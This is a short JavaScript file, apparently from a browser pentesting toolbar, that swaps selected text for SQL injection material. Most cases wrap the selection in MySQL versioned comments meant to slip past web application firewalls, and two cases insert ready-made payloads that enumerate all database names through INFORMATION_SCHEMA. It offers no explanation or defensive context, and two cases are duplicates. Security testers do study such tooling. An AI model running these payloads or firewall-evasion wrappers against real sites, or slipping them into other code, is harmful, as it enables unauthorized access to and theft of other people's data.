$(document).ready(function() {
	$(function() {
		$(".opt-waf").on("click", function() {
			let opt = this.id;
			var str = "";
			var string = "";

			switch (opt) {
				/*------STRING------*/
				case "waf1":
					str = getSelectedText();
					string = "/*!" + str + "------*/";
					break;

				/*------50000 STRING------*/
				case "waf2":
					str = getSelectedText();
					string = "/*!50000" + str + "------*/";
					break;

				/*------12345 STRING------*/
				case "waf3":
					str = getSelectedText();
					string = "/*!12345" + str + "------*/";
					break;

				/*------13337 STRING------*/
				case "waf4":
					str = getSelectedText();
					string = "/*!13337" + str + "------*/";
					break;

				/*------13337 STRING------*/
				case "waf5":
					str = getSelectedText();
					string = "/*!13337" + str + "------*/";
					break;

				/*------GET TABLES GROUP_CONCAT------*/
				case "wafset1":
					string = "(SELECT+CONCAT(COUNT(schema_name),0x202f20446174616261736573)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
					break;

				/*------GET COLUMNS GROUP_CONCAT------*/
				case "wafset2":
					string = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";
					break;

				default:
					string = "www.facebook.com/Jalkhov";
			}
			setSelectedText(string);
		});
	});
});